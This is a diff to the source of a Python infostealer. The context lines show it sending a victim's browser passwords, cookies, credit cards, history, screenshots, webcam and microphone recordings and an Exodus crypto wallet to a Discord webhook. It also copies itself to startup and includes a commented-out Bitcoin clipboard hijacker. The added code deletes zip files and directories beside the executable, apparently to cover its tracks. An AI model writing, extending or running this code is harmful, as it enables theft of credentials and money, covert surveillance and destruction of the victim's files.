@@ -1,3 +1,4 @@
+#Import libraries
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import browser_cookie3
 from urllib.request import urlopen
@@ -53,9 +54,21 @@ def copy_to_startup():
     except PermissionError as e:
         pass  
 
+def remove_all_zip_files(directory):
+    for item in os.listdir(directory):
+        item_path = os.path.join(directory, item)
+        if os.path.isfile(item_path) and item_path.lower().endswith(".zip"):
+            try:
+                os.remove(item_path)
+            except Exception as e:
+                pass
+        elif os.path.isdir(item_path):
+            try:
+                shutil.rmtree(item_path)
+            except Exception as e:
+                pass
 
-
-webhook = DiscordWebhook(url='Your URL')#Set up webhook
+webhook = DiscordWebhook(url='YOURWEBHOOKURL')#Set up webhook
 def ip4():#Get ipv4
     try:
      with urlopen('https://4.ident.me') as response:
@@ -639,13 +652,13 @@ try:
        webhook.add_file(file.read(), "History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip")
 except PermissionError as e:
     webhook.set_content('Permission error to access the browserfiles. Victim needs computer shutdown for restrictions to be lifted')   
+
 screenie()#screenshots the users screen  
-   
 exo()#get exodus cryptowallet Appdata and adds the zip to webhook
  
 webcamthread.join()
 micthread.join()
-
+remove_all_zip_files(os.path.dirname(sys.executable))    
 webhook.execute()
 
 #INDEV (BTC WALLET ADDRESS REPLACER AND COPY TO STARTUP):
@@ -661,4 +674,5 @@ webhook.execute()
 #         if ourbtc:
 #            pyperclip.copy("YourBTCWALLETaddress")
 #     except pyperclip.PyperclipException:
-#        pass   
+#        pass  
+  
